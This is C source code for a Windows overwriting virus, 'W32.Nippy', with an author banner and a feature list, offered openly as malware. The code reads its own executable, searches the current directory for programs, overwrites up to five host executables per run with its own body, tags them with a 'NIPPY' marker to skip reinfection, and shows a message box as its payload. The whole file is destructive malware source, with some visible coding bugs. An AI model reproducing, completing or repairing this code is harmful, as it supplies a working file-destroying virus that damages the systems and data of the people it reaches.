//	=======================W32.Nippy=========================
//	|						     |
//	|						     |
// 	|	Author:	Moaphie/F-13 LABS			     |
//	|	Email:	prommas_6@hotmail.com		     |
	|	 http://moaphie.awardspce.com    		     |
//	=========================================================
//	===============
//	|Virus Description|
//	==========================================================
//	| - simple infection method by overwrite the EXE files		       |
//	| - infect 5 files per run					       |
//	| - Cross-Directory infection				       |
//	==========================================================
//
//
//----------------------------------------------------------------FILE BEGINS-------------------------------------------------------------------------------------
#include<windows.h>
#pragma comment(lib,"user32")
#pragma comment(lib,"shell32")

	LPDWORD br,bw;
	HGLOBAL Vir;
	LPVOID VirBlock;
	int virsize;
	char virname[MAX_PATH];
	char hostname[MAX_PATH];
	HINSTANCE kernel;
	FARPROC FileOpen,FileRead,FileWrite,FileClose,SetPointer;
	

int WINAPI WinMain(HINSTANCE hInstance,
                             HINSTANCE hPrevInstance,
                           LPSTR lpCmdLine,
                           int nCmdShow)

{
	WIN32_FIND_DATA fdata;
	HANDLE hfile;
	int fcount=1,no_more_files=1;
	
	kernel=LoadLibrary("kernel32.dll");
	FileOpen=GetProcAddress(kernel,"CreateFileA");
	FileRead=GetProcAddress(kernel,"ReadFile");
	FileWrite=GetProcAddress(kernel,"WriteFile");
	FileClose=GetProcAddress(kernel,"CloseHandle");
	SetPointer=GetProcAddress(kernel,"SetFilePointer");

	Payload();

	GetModuleFileName(NULL,virname,sizeof(virname));
	virsize=GetCompressedFileSize(virname,NULL);
	Vir=GlobalAlloc(GMEM_MOVEABLE,virsize);
	VirBlock=GlobalLock(Vir);

	hfile=CreateFile(virname,GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	FileRead(hfile,VirBlock,virsize,&br,0);

	FileClose(hfile);

	hfile=FindFirstFile("*.*",&fdata);
	while((no_more_files!=0) && (fcount!=5)){

			no_more_files=FindNextFile(hfile,&fdata);

			if(FindExecutable(fdata.cFileName,0,hostname)>32){

			if(isinfected(hostname)==FALSE){
				
				infect_file(hostname);  

				fcount+=1;	
			}
			}	
	}
	
	return 0;
}

int infect_file(LPSTR host){
	HANDLE hh;
	int sz;
	hh=FileOpen(host,GENERIC_WRITE+GENERIC_READ,
		FILE_SHARE_WRITE+FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	sz=(int)GetCompressedFileSize(host,NULL);

	SetPointer(hh,0,0,FILE_BEGIN);
	FileWrite(hh,VirBlock,virsize,&bw,0);
	SetPointer(hh,0,0,FILE_END);
	FileWrite(hh,"NIPPY",5,&bw,0);

	FileClose(hh);

return 0;
}

int Payload(){
	MessageBox(NULL,"NIPPY\n\nWIRTTEN BY MOAPHIE\F-13 LABS","Nippy",MB_OK);
	return 0;
	}

BOOL isinfected(LPSTR host){
	int sz;
	LPDWORD br2;
	HANDLE hi;
	BYTE mark[5];

	hi=FileOpen(host,GENERIC_READ+GENERIC_WRITE,
		FILE_SHARE_READ+FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);

	sz=(int)GetCompressedFileSize(host,NULL);


	SetPointer(hi,(sz-5),0,FILE_BEGIN);
	FileRead(hi,mark,5,&br2,0);
	mark[5]='\0';

	if(lstrcmp(mark,"NIPPY")==0)
		return TRUE; 
	else
		return FALSE;    
	

	FileClose(hi);

}
	
//---------------------------------------------------------------------END OF FILE-------------------------------------------------------------------------------------	